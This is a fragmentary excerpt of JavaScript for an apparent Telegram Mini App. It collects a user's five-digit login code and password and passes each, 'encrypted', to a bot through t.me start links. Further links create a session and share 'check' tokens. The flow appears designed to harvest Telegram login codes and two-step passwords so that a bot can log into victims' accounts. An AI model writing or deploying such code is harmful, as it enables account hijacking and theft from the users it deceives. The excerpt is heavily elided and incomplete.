...
const BOT_USERNAME = "botname_bot";
...
async function appendCodeDigit(digit) {
    ...
    if (currentCode.length === 5) {
        ...
        // Отправляем код боту
        tg.openTelegramLink(`https://t.me/${BOT_USERNAME}?start=sendCode_${currentUserId}_${encryptedCode}`);
...
if (passwordSubmit) {
    passwordSubmit.addEventListener('click', async () => {
        ...
        tg.openTelegramLink(`https://t.me/${BOT_USERNAME}?start=sendPassword_${currentUserId}_${encryptedPassword}`);
...
function startAuthFlow() {
    ...
    tg.openTelegramLink(`https://t.me/${BOT_USERNAME}?start=createSession_${currentUserId}`);
...
if (checkSubmit) {
    checkSubmit.addEventListener('click', async () => {
        ...
        const shareLink = `https://t.me/${BOT_USERNAME}?start=${token}`;
...
if (checkCopyBtn) {
    checkCopyBtn.addEventListener('click', () => {
        const shareLink = `https://t.me/${BOT_USERNAME}?start=${lastCheckToken}`;
